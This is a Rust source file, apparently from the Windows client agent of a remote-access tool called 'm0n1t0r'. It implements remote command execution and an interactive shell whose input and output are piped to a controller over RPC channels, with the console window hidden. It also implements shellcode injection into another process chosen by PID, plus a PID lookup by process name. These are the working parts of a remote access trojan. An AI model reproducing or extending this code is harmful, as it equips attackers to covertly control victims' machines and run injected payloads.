use anyhow::anyhow;
use m0n1t0r_common::{Error, Result as AppResult, process::execute::Output};
use remoc::{
    chmux::ReceiverStream,
    rch::bin::{self, Receiver, Sender},
    rtc,
};
use std::{process::Stdio, thread};
use tokio::{io, process::Command, select, sync::oneshot};
use tokio_util::io::{CopyToBytes, SinkWriter, StreamReader};
use winapi::um::winbase::CREATE_NO_WINDOW;

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::process::Agent for AgentObj {
    async fn execute(&self, command: String, args: Vec<String>) -> AppResult<Output> {
        let (tx, rx) = oneshot::channel();

        thread::spawn(move || {
            let _ = tx.send(ffi::execute(command, args));
            Ok::<_, anyhow::Error>(())
        });
        Ok(rx.await??.into())
    }

    async fn interactive(&self, command: String) -> AppResult<(Sender, Receiver, Receiver)> {
        let (stdin_tx, stdin_rx) = bin::channel();
        let (stdout_tx, stdout_rx) = bin::channel();
        let (stderr_tx, stderr_rx) = bin::channel();
        let mut process = Command::new(command)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;

        tokio::spawn(async move {
            let mut stdin = process.stdin.take().unwrap();
            let mut stdout = process.stdout.take().unwrap();
            let mut stderr = process.stderr.take().unwrap();
            let mut stdin_rx = StreamReader::new(ReceiverStream::new(stdin_rx.into_inner().await?));
            let mut stdout_sink =
                SinkWriter::new(CopyToBytes::new(stdout_tx.into_inner().await?.into_sink()));
            let mut stderr_sink =
                SinkWriter::new(CopyToBytes::new(stderr_tx.into_inner().await?.into_sink()));

            select! {
                _ = io::copy(
                    &mut stdin_rx,
                    &mut stdin,
                ) => process.kill().await?,
                _ = io::copy(
                    &mut stdout,
                    &mut stdout_sink,
                ) => process.kill().await?,
                _ = io::copy(
                    &mut stderr,
                    &mut stderr_sink,
                ) => process.kill().await?,
                _ = process.wait() => {},
            }

            Ok::<_, Error>(())
        });
        Ok((stdin_tx, stdout_rx, stderr_rx))
    }

    async fn inject_shellcode_by_id(
        &self,
        pid: u32,
        shellcode: Vec<u8>,
        ep_offset: u32,
        parameter: Vec<u8>,
    ) -> AppResult<()> {
        let (tx, rx) = oneshot::channel();

        thread::spawn(move || {
            let _ = tx.send(
                match ffi::inject_shellcode_by_id(pid, shellcode, ep_offset, parameter)? {
                    true => Ok(()),
                    false => Err(Error::from(anyhow!("Failed to inject shellcode"))),
                },
            );
            Ok::<_, anyhow::Error>(())
        });
        Ok(rx.await??.into())
    }

    async fn id_by_name(&self, name: String) -> AppResult<u32> {
        Ok(ffi::id_by_name(name)?)
    }
}

#[cxx::bridge]
mod ffi {
    #[derive(Serialize, Deserialize, Debug)]
    pub struct Output {
        pub success: bool,
        pub out: Vec<u8>,
        pub err: Vec<u8>,
    }

    extern "Rust" {}

    unsafe extern "C++" {
        include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/process.h");

        fn execute(command: String, args: Vec<String>) -> Result<Output>;

        fn inject_shellcode_by_id(
            pid: u32,
            shellcode: Vec<u8>,
            ep_offset: u32,
            parameter: Vec<u8>,
        ) -> Result<bool>;

        fn id_by_name(name: String) -> Result<u32>;
    }
}

impl From<ffi::Output> for Output {
    fn from(value: ffi::Output) -> Self {
        Self {
            success: value.success,
            stdout: value.out,
            stderr: value.err,
        }
    }
}
